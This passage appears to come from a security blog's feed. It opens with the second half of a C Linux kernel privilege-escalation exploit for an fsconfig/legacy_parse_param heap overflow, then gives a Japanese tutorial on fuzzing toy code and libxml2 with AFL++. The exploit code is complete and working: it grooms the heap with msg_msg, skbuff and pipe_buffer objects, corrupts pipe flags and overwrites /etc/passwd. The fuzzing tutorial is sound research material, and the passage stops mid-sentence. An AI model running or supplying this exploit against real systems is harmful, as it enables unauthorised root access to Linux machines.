IPC_NOWAIT);</span><br><span class="line">        if ((copy_size &lt; 0) || (copy_size != sizeof(msg_a_oob.mtext))) &#123;</span><br><span class="line">            logd(&quot;[-] Recv from corrupted msg_msg failed\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        uint64_t *oob_data = (uint64_t *)(msg_a_oob.mtext + sizeof(msg_a.mtext));</span><br><span class="line">        size_t oob_size = sizeof(msg_a_oob.mtext) - sizeof(msg_a.mtext);</span><br><span class="line">        struct msg_msg *p = (struct msg_msg *)oob_data;</span><br><span class="line">        if (((int *)&amp;p-&gt;mtext)[0] != MSG_SIG) &#123;</span><br><span class="line">            logd(&quot;[-] I don&#x27;t think this can happen\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        heap_buffer_addr = p-&gt;m_list.next + sizeof(struct msg_msg);</span><br><span class="line">        logd(&quot;[+] heap_buffer_addr: 0x%lx\n&quot;, heap_buffer_addr);</span><br><span class="line">        if (strlen((char *)&amp;heap_buffer_addr) &lt; 8) &#123;</span><br><span class="line">            logd(&quot;[-] pointer can&#x27;t contain 0x00 bytes\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // clean uncorrupted msg_msg</span><br><span class="line">    logd(&quot;[*] clean unused msg_msg ...\n&quot;);</span><br><span class="line">    clean_msq_2();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int exploit_step2(int fd) &#123;</span><br><span class="line">    char buff[0x1000];</span><br><span class="line"></span><br><span class="line">    logd(&quot;[*] prepare fsconfig heap overflow\n&quot;);</span><br><span class="line">    memset(buff, 0, sizeof(buff));</span><br><span class="line">    memset(buff, &#x27;A&#x27;, 0x100 - 2);</span><br><span class="line">    for (int i = 0; i &lt; 0xf; i++) &#123;</span><br><span class="line">        fsconfig(fd, FSCONFIG_SET_STRING, &quot;\x00&quot;, buff, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    memset(buff, 0, sizeof(buff));</span><br><span class="line">    memset(buff, &#x27;B&#x27;, 0x100 - 3);</span><br><span class="line">    fsconfig(fd, FSCONFIG_SET_STRING, &quot;\x00&quot;, buff, 0);</span><br><span class="line"></span><br><span class="line">    // alloc msg_msg with 0x1000(-0x30) body and 0x400(-0x08) msg_msgseg</span><br><span class="line">    logd(&quot;[*] sparying msg_msg ...\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">        memset(&amp;msg_a, 0, sizeof(msg_a));</span><br><span class="line">        msg_a.mtype = MTYPE_A;</span><br><span class="line">        memset(msg_a.mtext, &#x27;Q&#x27;, sizeof(msg_a.mtext));</span><br><span class="line">        ((int *)&amp;msg_a.mtext)[0] = MSG_SIG;</span><br><span class="line">        ((int *)&amp;msg_a.mtext)[1] = i;</span><br><span class="line">        if (msgsnd(msqid_1[i], &amp;msg_a, sizeof(msg_a.mtext), 0) &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] msgsnd() fail\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // trigger oob write to overwrite msg_msg.next (hopes)</span><br><span class="line">    logd(&quot;[*] trigger oob write in `legacy_parse_param` to corrupt msg_msg.next\n&quot;);</span><br><span class="line">    memset(buff, 0, sizeof(buff));</span><br><span class="line">    struct msg_msg *p = (struct msg_msg *)buff;</span><br><span class="line">    p-&gt;m_list.next = heap_buffer_addr;</span><br><span class="line">    p-&gt;m_list.prev = 0xdeadbeefdeadbeef;</span><br><span class="line">    p-&gt;m_type = MTYPE_A; // with &#x27;=&#x27; appended</span><br><span class="line">    fsconfig(fd, FSCONFIG_SET_STRING, buff, &quot;\x00&quot;, 0);</span><br><span class="line"></span><br><span class="line">    // free uaf msg_msg</span><br><span class="line">    logd(&quot;[*] free uaf msg_msg from correct msqid\n&quot;);</span><br><span class="line">    if (msgrcv(list2_leak_msqid, &amp;msg_b, sizeof(msg_b.mtext), list2_uaf_mtype, 0) &lt; 0) &#123;</span><br><span class="line">        logd(&quot;[-] msgrcv() fail\n&quot;);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // spary skbuff_data to re-acquire uaf msg_msg and fake the header</span><br><span class="line">    logd(&quot;[*] spray skbuff_data to re-acquire the 0x400 slab freed by msg_msg\n&quot;);</span><br><span class="line">    &#123;</span><br><span class="line">        memset(buff, 0, sizeof(buff));</span><br><span class="line">        struct msg_msg *p = (struct msg_msg *)buff;</span><br><span class="line">        p-&gt;m_list.next = heap_buffer_addr + 0x80;</span><br><span class="line">        p-&gt;m_list.prev = heap_buffer_addr + 0x80;</span><br><span class="line">        p-&gt;m_ts = 0x100;</span><br><span class="line">        p-&gt;m_type = MTYPE_FAKE;</span><br><span class="line">        p-&gt;next = 0;</span><br><span class="line">        p-&gt;security = 0;</span><br><span class="line">        spray_skbuff_data(buff, 0x400 - 0x140);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // free uaf msg_msg</span><br><span class="line">    logd(&quot;[*] free skbuff_data using fake msqid\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">        if (msgrcv(msqid_1[i], &amp;msg_b, sizeof(msg_b.mtext), MTYPE_FAKE, IPC_NOWAIT) &gt; 0) &#123;</span><br><span class="line">            logd(&quot;[*] freed using msqid %d\n&quot;, i);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // filled with pipe_buffer</span><br><span class="line">    logd(&quot;[*] spray pipe_buffer to re-acquire the 0x400 slab freed by skbuff_data\n&quot;);</span><br><span class="line">    int passwd = open(&quot;/etc/passwd&quot;, O_RDONLY);</span><br><span class="line">    if (passwd &lt; 0) &#123;</span><br><span class="line">        perror(&quot;open passwd&quot;);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    for (int i = 0; i &lt; NUM_PIPES; i++) &#123;</span><br><span class="line">        if (pipe(dummy_pipe[i])) &#123;</span><br><span class="line">            logd(&quot;[-] Alloc pipe failed\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const unsigned pipe_size = fcntl(dummy_pipe[i][1], F_GETPIPE_SZ);</span><br><span class="line">        static char tmp_buff[4096];</span><br><span class="line"></span><br><span class="line">        /* fill the pipe completely; each pipe_buffer will now have</span><br><span class="line">           the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">        for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">            unsigned n = r &gt; sizeof(tmp_buff) ? sizeof(tmp_buff) : r;</span><br><span class="line">            write(dummy_pipe[i][1], tmp_buff, n);</span><br><span class="line">            r -= n;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="line">           leaving the flags initialized) */</span><br><span class="line">        for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">            unsigned n = r &gt; sizeof(tmp_buff) ? sizeof(tmp_buff) : r;</span><br><span class="line">            read(dummy_pipe[i][0], tmp_buff, n);</span><br><span class="line">            r -= n;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(dummy_pipe[i][1], buff, 0x100 + i);</span><br><span class="line"></span><br><span class="line">        loff_t offset = 1;</span><br><span class="line">        ssize_t nbytes = splice(passwd, &amp;offset, dummy_pipe[i][1], NULL, 1, 0);</span><br><span class="line">        if (nbytes &lt; 0) &#123;</span><br><span class="line">            perror(&quot;splice failed&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logd(&quot;[*] free skbuff_data to make pipe_buffer become UAF\n&quot;);</span><br><span class="line">    int uaf_pipe_idx = 0;</span><br><span class="line">    char pipe_buffer_backup[0x280];</span><br><span class="line">    int PIPE_BUF_FLAG_CAN_MERGE = 0x10;</span><br><span class="line">    &#123;</span><br><span class="line">        void *ptr = buff;</span><br><span class="line">        uint64_t size = 0x400 - 0x140;</span><br><span class="line">        for (int i = 0; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">            for (int j = 0; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">                if (read(sock_pairs[i][1], ptr, size) &lt; 0) &#123;</span><br><span class="line">                    logd(&quot;[-] read from sock pairs failed\n&quot;);</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line">                uint32_t test_size = ((uint32_t *)ptr)[3];</span><br><span class="line">                if ((test_size &gt;= 0x100) &amp;&amp; (test_size &lt; 0x100 + NUM_PIPES)) &#123;</span><br><span class="line">                    uaf_pipe_idx = test_size - 0x100;</span><br><span class="line">                    logd(&quot;[*] uaf_pipe_idx: %d\n&quot;, uaf_pipe_idx);</span><br><span class="line">                    memcpy(pipe_buffer_backup, ptr, 0x280);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logd(&quot;[*] edit pipe_buffer-&gt;flags\n&quot;);</span><br><span class="line">    &#123;</span><br><span class="line">        memset(buff, 0, sizeof(buff));</span><br><span class="line">        memcpy(buff, pipe_buffer_backup, 0x280);</span><br><span class="line">        ((uint64_t *)buff)[6] = 0;                       // offset | len</span><br><span class="line">        ((uint64_t *)buff)[8] = PIPE_BUF_FLAG_CAN_MERGE; // flag</span><br><span class="line">        spray_skbuff_data(buff, 0x400 - 0x140);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logd(&quot;[*] try to overwrite /etc/passwd\n&quot;);</span><br><span class="line">    &#123;</span><br><span class="line">        ssize_t nbytes = write(dummy_pipe[uaf_pipe_idx][1], &quot;AAAA&quot;, 4);</span><br><span class="line">        if (nbytes &lt; 0) &#123;</span><br><span class="line">            perror(&quot;write failed&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ((size_t)nbytes &lt; 2) &#123;</span><br><span class="line">            fprintf(stderr, &quot;short write\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logd(&quot;[*] see if /etc/passwd changed\n&quot;);</span><br><span class="line">    system(&quot;cat /etc/passwd&quot;);</span><br><span class="line">    logd(&quot;[+] exploit success\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">    int sync_pipe[2];</span><br><span class="line">    pipe(sync_pipe);</span><br><span class="line"></span><br><span class="line">    pid_t pid = fork();</span><br><span class="line">    if (!pid) &#123;</span><br><span class="line">        logd(&quot;[+] perform initialization\n&quot;);</span><br><span class="line">        init_unshare();</span><br><span class="line">        bind_cpu();</span><br><span class="line">        init_msq();</span><br><span class="line">        init_sock();</span><br><span class="line"></span><br><span class="line">        int fd;</span><br><span class="line"></span><br><span class="line">        fd = call_fsopen();</span><br><span class="line">        logd(&quot;[+] perform exploit step1\n&quot;);</span><br><span class="line">        while (exploit_step1(fd)) &#123;</span><br><span class="line">            logd(&quot;[!] retry step1 ...\n&quot;);</span><br><span class="line"></span><br><span class="line">            close(fd);</span><br><span class="line">            fd = call_fsopen();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fd = call_fsopen();</span><br><span class="line">        logd(&quot;[+] perform exploit step2\n&quot;);</span><br><span class="line">        while (exploit_step2(fd)) &#123;</span><br><span class="line">            logd(&quot;[!] retry step2 ...\n&quot;);</span><br><span class="line"></span><br><span class="line">            close(fd);</span><br><span class="line">            fd = call_fsopen();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(sync_pipe[1], &quot;A&quot;, 1);</span><br><span class="line">        while (1) &#123;</span><br><span class="line">            sleep(10);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        char sync;</span><br><span class="line">        read(sync_pipe[0], &amp;sync, 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../../../img/bin/linux/13.png" alt="avatar"></p><p><img src="/../../../img/bin/linux/14.png" alt="avatar"></p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFLplusplus</title>
      <link href="/2022/09/03/fuzz/afl/AFLplusplus/"/>
      <url>/2022/09/03/fuzz/afl/AFLplusplus/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00-インストール"><a href="#0x00-インストール" class="headerlink" title="0x00 インストール"></a>0x00 インストール</h4><h5 id="インストールに必要なものt"><a href="#インストールに必要なものt" class="headerlink" title="インストールに必要なものt"></a>インストールに必要なものt</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git build-essential curl libssl-dev sudo libtool libtool-bin libglib2.0-dev bison flex automake python3 python3-dev python3-setuptools libpixman-1-dev gcc-10-plugin-dev cgroup-tools \</span><br><span class="line">clang-11 clang-tools-11 libc++1-11 libc++-11-dev libc++abi1-11 libc++abi-11-dev libclang1-11 libclang-11-dev libclang-common-11-dev libclang-cpp11 libclang-cpp11-dev liblld-11 liblld-11-dev liblldb-11 liblldb-11-dev libllvm11 libomp-11-dev libomp5-11 lld-11 lldb-11 python3-lldb-11 llvm-11 llvm-11-dev llvm-11-runtime llvm-11-tools libstdc++-10-dev</span><br></pre></td></tr></table></figure><h5 id="llvmのウェブサイトの指示に従って、llvmの依存関係をインストールします。"><a href="#llvmのウェブサイトの指示に従って、llvmの依存関係をインストールします。" class="headerlink" title="llvmのウェブサイトの指示に従って、llvmの依存関係をインストールします。"></a>llvmのウェブサイトの指示に従って、llvmの依存関係をインストールします。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;$(wget -O - https://apt.llvm.org/llvm.sh)&quot;</span><br></pre></td></tr></table></figure><h5 id="そして、clangなどのコンパイラを切り替えて使用します。"><a href="#そして、clangなどのコンパイラを切り替えて使用します。" class="headerlink" title="そして、clangなどのコンパイラを切り替えて使用します。"></a>そして、clangなどのコンパイラを切り替えて使用します。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/clang clang `which clang-11` 1</span><br><span class="line">sudo update-alternatives --install /usr/bin/clang++ clang++ `which clang++-11` 1</span><br><span class="line">sudo update-alternatives --install /usr/bin/llvm-config llvm-config `which llvm-config-11` 1</span><br><span class="line">sudo update-alternatives --install /usr/bin/llvm-symbolizer llvm-symbolizer `which llvm-symbolizer-11` 1</span><br></pre></td></tr></table></figure><h5 id="依存関係が全て揃った状態で、afl-をダウンロードし、コンパイルしてください。"><a href="#依存関係が全て揃った状態で、afl-をダウンロードし、コンパイルしてください。" class="headerlink" title="依存関係が全て揃った状態で、afl++をダウンロードし、コンパイルしてください。"></a>依存関係が全て揃った状態で、afl++をダウンロードし、コンパイルしてください。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/AFLplusplus/AFLplusplus</span><br><span class="line">$ cd AFLplusplus</span><br><span class="line">$ git checkout 2.68c # if you want a specific version, otherwise skip this step</span><br><span class="line">$ make distrib</span><br><span class="line">$ sudo make install</span><br><span class="line">$ sudo /path/AFLplusplus/afl-system-config</span><br></pre></td></tr></table></figure><h3 id="0x01-harness"><a href="#0x01-harness" class="headerlink" title="0x01 harness"></a>0x01 harness</h3><p>ハーネスの役割は、特定のライブラリコードに対するテストフレームワークの書き方を、デモを通して体験していただくことです。</p><p>研究テスターは、入力コーパスを作成し、変異させたコーパスを提供する。テストコード用のフレームワーク（書き込みハーネス）を書き、afl-clang-fast&#x2F;afl-gcc スタブでコンパイルし、フィードバックファズテストをサポートするバイナリを生成する。afl-fuzzは、キューを選び出し 変異したサンプルはテストフレームワーク（ハーネス）に投げられ、結果を監視します。もしクラッシュした場合はクラッシュに格納され、もし新しいパスのトリガーに成功した場合はキューに追加されます。</p><p>この実験は、ライブラリ文庫に対してテストコードを書くことで、ハーネスの書き方を理解するものでした。</p><p>ライブラリライブラリには、以下のようにlibrary.hで定義され、library.cで実装された2つのライブラリ関数があります。 目標は、この2つのライブラリ関数をaflを介してファジングできるアプリケーションフレームワークを書くことである。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">// an &#x27;nprintf&#x27; implementation - print the first len bytes of data</span><br><span class="line">void lib_echo(char *data, ssize_t len);</span><br><span class="line"></span><br><span class="line">// optimised multiply - returns x*y</span><br><span class="line">int  lib_mul(int x, int y);</span><br></pre></td></tr></table></figure><p>の機能は、次のとおりです。</p><ul><li>lib_echo：パラメータデータに含まれる文字列の最初のlenを出力する。</li><li>lib_mul：パラメータ x に y を乗じた値を出力する。</li></ul><p>私たちの目標は、この2つの機能に対するファジーテストを実装するためのフレームワークを書くことである。</p><p>この目的を達成するために、フレームワークには次のような機能が必要です。</p><ul><li>コンパイルされたプログラムは実行可能でなければならない。すなわち、実行可能なバイナリプログラムにコンパイルできるように、main関数が必要である。</li><li>aflをより効率的にファズするための情報をフィードバックする機能。つまり、書かれたコードをスタブ化し、afl-clang-fastやafl-clang、afl-gccを使ってコンパイルする必要があるのです。</li><li>afl が変異するためのデータインタフェースを提供する。すなわち、2つの関数が使用するパラメータデータは標準入力またはファイルから来るようにし、afl が変異しやすいようにすることである。</li></ul><p>最終的に書かれたコードは以下の通りです。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include &quot;library.h&quot;</span><br><span class="line"></span><br><span class="line">// fixed size buffer based on assumptions about the maximum size that is likely necessary to exercise all aspects of the target function</span><br><span class="line">#define SIZE 100</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">    if((argc == 2) &amp;&amp; strcmp(argv[1], &quot;echo&quot;) == 0) &#123;</span><br><span class="line">        // make sure buffer is initialized to eliminate variable behaviour that isn&#x27;t dependent on the input.</span><br><span class="line">        char input[SIZE] = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">        ssize_t length;</span><br><span class="line">        length = read(STDIN_FILENO, input, SIZE);</span><br><span class="line"></span><br><span class="line">        lib_echo(input, length);</span><br><span class="line">    &#125; else if ((argc == 2) &amp;&amp; strcmp(argv[1], &quot;mul&quot;) == 0) &#123;</span><br><span class="line">        int a,b = 0;</span><br><span class="line">        read(STDIN_FILENO, &amp;a, 4);</span><br><span class="line">        read(STDIN_FILENO, &amp;b, 4);</span><br><span class="line">        printf(&quot;%d\n&quot;, lib_mul(a,b));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        printf(&quot;Usage: %s mul|echo\n&quot;, argv[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main 関数は、lib_echo 関数と lib_mul のどちらをファズテストするか決めるためにコマンドライン引数を取り（最初の要件を満たす）、次に標準入力の読み込みデータを引数として関数を呼び出し（2番目の要件を満たす）、最後にプログラムが afl-clang-fast でコンパイルされてフレーム生成 ( 第2要件を満たしている）。</p><p>コンパイルコマンドは</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AFL_HARDEN=1 afl-clang-fast harness.c library.c -o harness</span><br></pre></td></tr></table></figure><p>次に、lib_echo ライブラリ関数のファジングテストを実施します。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir echo_in</span><br><span class="line">echo aaaaaa &gt; echo_in/seed</span><br><span class="line">afl-fuzz -i echo_in -o out ./harness echo</span><br></pre></td></tr></table></figure><p>シードファイルを格納する echo_in フォルダを作成し、aaaaaa をシードファイルとして作成し、afl-fuzz を起動して lib_echo をファジングテストします。</p><p>というクラッシュをファジー化するのに時間はかかりません。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat out/default/crashes/id:000000,sig:06,src:000004,time:63255,op:havoc,rep:4</span><br><span class="line">pop!)!!!!%![1m</span><br></pre></td></tr></table></figure><p>lib_mul 関数のファジーテスト。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir mul_in</span><br><span class="line">echo &quot;1   3   &quot; &gt; mul_in/seed</span><br><span class="line">afl-fuzz -i mul_in -o out ./harness mul</span><br></pre></td></tr></table></figure><p>シードファイルを格納する echo_mul フォルダを作成し、1 3 の内容をシードファイルとして作成し、afl-fuzz を起動して lib_mul をファズテストします。</p><p>もちろん、コマンドラインでmulとechoのどちらかを指定するのではなく、特定の関数をファジングし、両方を同時にテストすることを考えることも可能である。</p><p>このデモでは、特定のターゲットをファジングする際に、aflをベースにした最適化フレームワークを書いて、コードをファジングする方法を紹介します。</p><h4 id="0x01-challenges"><a href="#0x01-challenges" class="headerlink" title="0x01 challenges"></a>0x01 challenges</h4><p>課題は、脆弱性を持つ実際のターゲットを、aflを使ってファズテストし、対応する脆弱性の発見に成功することで、aflの使い方をさらにマスターし、オリジナルの</p><h5 id="libxml2"><a href="#libxml2" class="headerlink" title="libxml2"></a>libxml2</h5><p>RUNOOB XMLチュートリアルによると、xmlとはeXtensible Markup Languageのことで、データの転送や保存を行うために設計された言語です。</p><p>XML文書は、「ルート」から始まって「ブランチ」へと展開するツリー構造を形成している。 この要素は、他のすべての要素の親となる。</p><p>XML文書内の要素は文書ツリーを形成する。 根元から始まり、木の下まで広がっていく。</p><p>すべての要素は子要素を持つことができる。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;root&gt;</span><br><span class="line">&lt;child&gt;</span><br><span class="line">&lt;subchild&gt;.....&lt;/subchild&gt;</span><br><span class="line">&lt;/child&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>要素間の関係を表す用語として、親、子、兄弟がある。 親要素は子要素を所有する。 同じレベルの子要素は兄弟（姉妹）になる。</p><p>libxml2 ライブラリは，XML 文書をパースするための関数を集めたライブラリです． C言語で書かれており、複数の言語で呼び出すことができます。 私たちの目標は、libxml2 ライブラリを afl++ でファズテストし、xml ファイル形式のパースにおける脆弱性を突くことができるかどうか確認することです。</p><p>そのために、まず、afl-trainingに従って、対応するバージョンのlibxml2をダウンロードします。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/GNOME/libxml2.git</span><br><span class="line">cd libxml2</span><br><span class="line">git submodule init</span><br><span class="line">git submodule update</span><br><span class="line">git checkout v2.9.2</span><br></pre></td></tr></table></figure><p>その後、コンパイルしてください。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CC=afl-clang-fast ./autogen.sh </span><br><span class="line">AFL_USE_ASAN=1 make -j 4</span><br></pre></td></tr></table></figure><p>環境変数の役割は、公式マニュアル - env_variables.txt で確認できます。 AFL_USE_ASAN の役割は、ASAN 機能を有効にしてクラッシュをよりよく検出できるようにすることです。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- Setting AFL_USE_ASAN automatically enables ASAN, provided that your</span><br><span class="line">  compiler supports that. Note that fuzzing with ASAN is mildly challenging</span><br><span class="line">  - see notes_for_asan.txt.</span><br></pre></td></tr></table></figure><p>libxml2は様々なインタフェースを提供しており、公式マニュアルを読めばさらに理解が深まるでしょう。</p><p>我々の目的は、ソフトウェアの脆弱性を掘り下げることではなく、ソフトウェアの脆弱性を掘り下げることでaflの使い方をさらにマスターすることなので、Libxml2の公式サンプル集を見て、parse1.c: XMLファイルを木にパースして、それを自由に修正していくことを選べばいいのです。 その結果、以下のようなharness.cのコードが出来上がりました。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;libxml/parser.h&quot;</span><br><span class="line">#include &quot;libxml/tree.h&quot;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    if (argc != 2)</span><br><span class="line">        return -1;</span><br><span class="line"></span><br><span class="line">    xmlDocPtr doc; /* the resulting document tree */</span><br><span class="line"></span><br><span class="line">    doc = xmlReadFile(argv[1], NULL, 0);</span><br><span class="line">    if (doc == NULL) &#123;</span><br><span class="line">            return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlFreeDoc(doc);</span><br><span class="line"></span><br><span class="line">    xmlCleanupParser();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主なファズAPIは、xmlReadFile、xmlFreeDoc、xmlCleanupParser関数で、コマンドラインからxmlファイル名が渡され、それに続いてファイルデータをパースする対応する関数が渡されることがわかると思います。 afl関数は、libxml2をファズテストするために、xmlファイルを変異させるために使用されます。</p><p>ハーネスをコンパイルするためのコマンドは以下のとおりです。 -I はヘッダファイルのあるパスを指定し，ファジング対象の関数をハーネスにリンクするために libxml2 の静的リンクライブラリを，-lm は数学ライブラリを，-lz は zlib ライブラリを使用することを指定します．</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AFL_USE_ASAN=1 afl-clang-fast ./harness.c -I ~/work/fuzz/libxml2/include ~/work/fuzz/libxml2/.libs/libxml2.a -lz -lm -o fuzzer</span><br></pre></td></tr></table></figure><p>ファジーテストのシードファイルを作成します。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir in</span><br><span class="line">vim in/seed.xml</span><br></pre></td></tr></table></figure><p>seed.xml文件内容如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>ファザーを起動します。<br>afl-fuzz -i in -o out .&#x2F;fuzzer @@<br>この場合、メモリの制限によりエラーとなる場合があります。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[-] Whoops, the target binary crashed suddenly, before receiving any input</span><br><span class="line">    from the fuzzer! Since it 